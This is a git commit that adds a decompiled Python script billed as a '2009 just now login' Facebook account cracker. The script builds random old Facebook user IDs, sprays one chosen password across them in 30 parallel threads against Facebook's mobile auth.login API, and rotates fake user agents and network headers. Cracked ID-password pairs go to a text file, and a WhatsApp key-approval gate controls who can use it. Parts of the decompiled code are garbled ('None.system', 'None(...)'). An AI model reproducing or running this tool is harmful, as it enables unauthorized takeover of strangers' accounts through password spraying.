458bfe542c73edc42ee12a3ed88b9641af669cbb
Black-Boy <108489528+X-R-404@users.noreply.github.com>
2022-10-16 23:52:01 +0600

    Add files via upload

---
+++ KHALID_dec.py
@@ -0,0 +1,259 @@
+# Source Generated with Decompyle++
+# X-R-404 
+W = '\x1b[97;1m'
+R = '\x1b[91;1m'
+G = '\x1b[92;1m'
+Y = '\x1b[93;1m'
+B = '\x1b[94;1m'
+P = '\x1b[95;1m'
+C = '\x1b[96;1m'
+N = '\x1b[0m'
+import os
+
+try:
+    import requests
+finally:
+    pass
+#os.system('pip install requests')
+
+try:
+    import concurrent.futures as concurrent
+finally:
+    pass
+#os.system('pip install futures')
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import bs4
+import uuid
+import json
+import os
+import sys
+import random
+import datetime
+import time
+import re
+import subprocess
+time.sleep(0.03)
+
+def main_apv():
+    imt = 'MAW76=='
+    ak = 'KHALID~~UID=='
+    os.system('clear')
+    print(logo)
+    
+    try:
+        key1 = open('/data/data/com.termux/files/usr/bin/.akkil.cov', 'r').read()
+    finally:
+        pass
+    os.system('clear')
+    print(logo)
+    print('  Your Token Is Not Approved Already')
+    print('           THIS IS YOUR KEY')
+    print('')
+    myid = uuid.uuid4().hex[:10].upper()
+    print('          YOUR KEY : ' + ak + myid + imt)
+    print('[$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')
+    kok = open('/data/data/com.termux/files/usr/bin/.akkil.cov', 'w')
+    kok.write(myid + imt)
+    kok.close()
+    print('')
+    print('')
+    print('     Copy Key And Sent Me WhatsApp Approvel Your Key ')
+    print('[$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')
+    time.sleep(3.5)
+    tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20' + ak + '' + myid + '' + imt
+    os.system('am start https://wa.me/+8801798396843?text=' + tks)
+    r1 = requests.get('https://github.com/KHALID-SHAIFULLAH/OLD-CRACK/blob/main/Approval.txt').text
+    if key1 in r1:
+        Main()
+        #return None
+    None.system('clear')
+    print(logo)
+    print('\x1b[1;91m        YOUR TOKEN IS NOT APPROVED YET')
+    print('\x1b[1;92m        YOUR KEY : ' + ak + key1)
+    print('\x1b[1;93m        COPY YOUR KEY AND SEND TO ME ON WHATSAPP ')
+    time.sleep(3.5)
+    tks = 'DEAR%20ADMIN,%20PLEASE%20APPROVE%20MY%20KEY%20TO%20PREMIUM✅%20%20%20%20%20MY%20%20KEY%20%20:%20' + ak + '' + key1
+    os.system('am start https://wa.me/+8801798396843?text=' + tks)
+    #return None
+
+
+logo = '\n  \x1b[1;92m  ┌─────────────────────────────────────────────────────┐\n  \x1b[1;92m  │                                                     │\n  \x1b[1;92m  │  \x1b[1;91m   ██   ██ ██   ██  █████  ██      ██ ██████   \x1b[1;92m    │\n  \x1b[1;92m  │  \x1b[1;92m   ██  ██  ██   ██ ██   ██ ██      ██ ██   ██  \x1b[1;92m    │\n  \x1b[1;92m  │  \x1b[1;93m   █████   ███████ ███████ ██      ██ ██   ██  \x1b[1;92m    │\n  \x1b[1;92m  │  \x1b[1;94m   ██  ██  ██   ██ ██   ██ ██      ██ ██   ██  \x1b[1;92m    │\n  \x1b[1;92m  │  \x1b[1;95m   ██   ██ ██   ██ ██   ██ ███████ ██ ██████   \x1b[1;92m    │\n  \x1b[1;92m  │                                                     │\n  \x1b[1;92m  └─────────────────────────────────────────────────────┘\n\n   \x1b[1;92m ┌─────────────────────────────────────────────────────┐\n   \x1b[1;92m │    \x1b[1;91m[\x1b[1;92m+\x1b[1;91m]\x1b[1;92m2009 JUST NOW LOG INABLE ACCOUNT CRACKER\x1b[1;91m[\x1b[1;92m+\x1b[1;91m]   \x1b[1;92m│\n   \x1b[1;92m └─────────────────────────────────────────────────────┘\n\n\x1b[1;92m    ┌─────────────────────────────────────────────────────┐\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] DEVELOPER  :            KHALID SHAIFULLAH        │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] FACEBOOK   :            KHALID SHAIFULLAH        │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] GITHUB     :            KHALID-SHAIFULLAH        │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] WHATSAPP   :            +8801798396843           │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] TOOLS      :            UID CRACK                │\n \x1b[1;92m   └─────────────────────────────────────────────────────┘'
+
+class Main:
+    
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system('clear')
+        print(logo)
+        print('\n [1] 2009-2010 ACCOUNT CRACK [ JUST NOW LOGIN ]')
+        print(' [2] CONTACT WITH DEVELOPER')
+        print(' [3] OUR FACEBOOK GROUP')
+        print(' [4] OUR YOUTUBE CHANNEL ')
+        KHALID = input(' CHOOSE : ')
+        if KHALID in ('1', '01'):
+            self.old()
+        if KHALID in ('2', '02'):
+            os.system('xdg-open https://www.facebook.com/KHALID.CYBER.404')
+            Main()
+        if KHALID in ('3', '03'):
+            os.system('xdg-open https://www.facebook.com/groups/termux.working.commands/?ref=share')
+            Main()
+        if KHALID in ('4', '04'):
+            os.system('xdg-open https://youtube.com/c/KhaliDTechBd1')
+            Main()
+            #return None
+        None(' SELECT CORRECTLY ')
+        time.sleep(1)
+        Main()
+
+    
+    def old(self):
+        x = 111111111
+        xx = 999999999
+        idx = '100000'
+        os.system('clear')
+        print(logo)
+        limit = int(input(' \n\x1b[0;95m[+]\x1b[0;93m LIMIT OF TOTAL IDS TO CRACK(MAXIMUM 50000): '))
+        
+        try:
+            for n in range(limit):
+                _ = random.randint(x, xx)
+                __ = idx
+                self.id.append(__ + str(_))
+            print('\x1b[0;93m [+] TOTAL ID -> \x1b[0;91m%s\x1b[0;97m' % len(self.id))
+            with ThreadPoolExecutor(30, **('max_workers',)) as coeg:
+                print('\n\x1b[1;32m [!] USE PASSWORD (123456) FOR FAST CLONING\x1b[1;37m ')
+                listpass = input('%s [?] ENTER PASSWORD :%s ' % (G, Y))
+                if len(listpass) <= 5:
+                    exit('\n%s [!] PASSWORD SHOULD BE MINIMUM 6 CHARACTERS' % B)
+                print('%s [*] CRACK WITH PASSWORD -> [\x1b[0;91m%s\x1b[0;93m]' % (G, listpass))
+                os.system('clear')
+                print(logo)
+                print('\n%s [+] OK RESULTS SAVED IN -> ok.txt' % Y)
+                print('%s [!] IF NO RESULT USE AIRPLANE MODE FOR 5 SECONDS\x1b[0m\n' % P)
+                for user in self.id:
+                    coeg.submit(self.api, user, listpass.split(','))
+                #None(None, None, None)
+            if not None:
+                pass
+            exit('\n\n [>>] CRACK COMPLETED*_*...')
+        finally:
+            #return None
+            Exception
+            e = None
+            
+            try:
+                exit(str(e))
+            finally:
+                e = None
+                del e
+                #return None
+                e = None
+                del e
+
+
+
+    
+    def api(self, uid, pwx):
+        rua = random.choice([
+            'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+            'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
+            'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 TV Safari/538.1',
+            'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 6.0; SAMSUNG SM-G935F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]',
+            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
+            'Mozilla/5.0 (Maemo; Linux; Jolla; Sailfish; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0',
+            'Nokia6280/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1',
+            'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
+            'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36',
+            'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/101.0',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53',
+            'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',
+            'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:101.0) Gecko/101.0 Firefox/101.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.41',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Vivaldi/4.3',
+            'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12',
+            'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/307.0.0.9.109;]',
+            'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
+            'Mozilla/5.0 (Linux; Android 11; A600DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-A920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
+            'Mozilla/5.0 (Linux; arm_64; Android 8.1.0; ZC520KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 YaBrowser/20.4.1.144.00 SA/1 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
+            'Mozilla/5.0 (X11; CrOS i686 6310.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.94 Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 7.0; Ilium M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 7.0; A10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 YaBrowser/20.4.2.269.10 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 8.0.0; XT1635-01 Build/ODNS27.76-12-30-8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
+            'Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X; en-us) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.0.2 Mobile/9A5248d Safari/6533.18.5',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/13.5.1 Safari/605.1.15 AlohaBrowser/2.21.3',
+            'Mozilla/5.0 (Linux; Android 6.0; ZTE BLADE A910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 10; J8210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 9; Nokia 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.60 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 9; LYA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; U; Android 9; az-az; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.2.6-g',
+            'Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 6.0; K-3 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
+            'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A405FM) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; U; Android 10; en-us; Mi 9T Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-gn',
+            'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-; C2305 Build/16.0.B.2.16) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Viber/12.9.5.2'])
+        sys.stdout.write('\r [XR] %s/%s -> OK:-%s - CP:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
+        sys.stdout.flush()
+        for pw in pwx:
+            pw = pw.lower()
+            ses = requests.Session()
+            headers = {
+                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+                'x-fb-sim-hni': str(random.randint(20000, 40000)),
+                'x-fb-net-hni': str(random.randint(20000, 40000)),
+                'x-fb-connection-quality': 'EXCELLENT',
+                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                'user-agent': rua,
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-http-engine': 'Liger' }
+            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers, **('headers',))
+            if 'session_key' in response.text and 'EAAA' in response.text:
+                print('\r \x1b[0;92m[XR-SUCCESSFUL] %s ✔ %s\x1b[0;97m         ' % (uid, pw))
+                print('\r \x1b[0;92m Congrats Bro ')
+                self.ok.append('%s✔%s' % (uid, pw))
+                open('XR-09-OK.txt', 'a').write(' %s✓%s\n' % (uid, pw))
+                print('\x1b[92;1m\n┌──────────────────────────────────────────────────┐\n│• STATUS     : ADD A EMAIL OR PHONE NUMBER        │\n│• SUGGESTION : LOGIN FACEBOOK OFFICIAL            │\n│• SOLUTION   : CLEAR FACEBOOK DATA+USE MOBILE DATA│\n└──────────────────────────────────────────────────┘')
+            elif 'www.facebook.com' in response.json()['error_msg']:
+                print('\r \x1b[0;92m[XR-SUCCESSFUL] %s ✔ %s\x1b[0;97m         ' % (uid, pw))
+                self.cp.append('%s✔%s' % (uid, pw))
+                open('XR-09-OK.txt', 'a').write(' %s | %s\n' % (uid, pw))
+                print('\x1b[92;1m\n┌──────────────────────────────────────────────────┐\n│• STATUS     : ADD A EMAIL OR PHONE NUMBER        │\n│• SUGGESTION : LOGIN FACEBOOK OFFICIAL            │\n│• SOLUTION   : CLEAR FACEBOOK DATA+USE MOBILE DATA│\n└──────────────────────────────────────────────────┘')
+            
+            self.loop += 1
+            #return None
+
+
+Main()
+#return None
+
+
